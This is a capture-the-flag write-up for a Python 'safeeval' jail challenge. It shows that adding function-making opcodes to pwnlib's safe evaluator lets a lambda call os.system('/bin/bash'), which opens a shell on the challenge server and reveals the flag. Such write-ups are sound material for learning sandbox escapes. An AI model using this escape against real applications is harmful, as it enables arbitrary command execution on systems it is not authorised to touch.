# Turing-complete safeeval
### JAIL - Easy

Hey! We just made a brand new Turing-complete calculator based on a slight modification of pwnlib.util.safeeval to allow defining functions, because otherwise it would be Turing-incomplete.


Still we are allowing only pure functions, so there is no security implication right?
Connect via nc safeeval.sdc.tf 1337


[Calculator source code](calc.py)

By k3v1n


## Solution

In the source code to pwnlib's safe eval were added this opcodes:
```python
# The above only allows Turing-incomplete evaluation,
# so we decided to add our own ingenious additions:
complete_codes = _expr_codes + ['MAKE_FUNCTION', 'CALL_FUNCTION']
```

This means that we can now create functions and call them. It is not enough to use `def func(): ...`, but just fine for lambdas!
```python
>>> (lambda: print(1))()
1
None
>>> (lambda: print(globals()))()
{'name': 'main', 'doc': None, 'package': None, 'loader' ... }
```

Fortunately, we already have os module in the namespace:
```python
>>> (lambda: os.system('/bin/bash'))()
ls
calc.py
flag.txt

cat flag.txt
sdctf{u5ing_l4mbDA5_t0_smUgg1e_m4licious_BYTECODEz}
```

#### Flag: sdctf{u5ing_l4mbDA5_t0_smUgg1e_m4licious_BYTECODEz}
